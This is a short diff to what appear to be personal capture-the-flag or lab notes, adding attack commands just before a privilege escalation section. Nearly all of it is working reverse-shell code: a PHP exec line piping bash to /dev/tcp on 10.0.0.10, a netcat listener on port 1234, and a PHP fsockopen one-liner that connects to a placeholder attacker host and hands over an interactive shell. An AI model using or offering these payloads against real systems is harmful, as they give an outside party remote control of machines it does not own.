@@ -34,6 +34,13 @@ sudo openvpn --config ./Desktop/yufujioka.ovpn
 <?php
 exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
 ```
+```
+nc -lnvp 1234
+```
+- Direct input
+```shell
+php -r '$sock=fsockopen("your.server.ip.address",8888);exec("/bin/bash -i <&3 >&3 2>&3");'
+```
 
 ### Privilege escalation
 
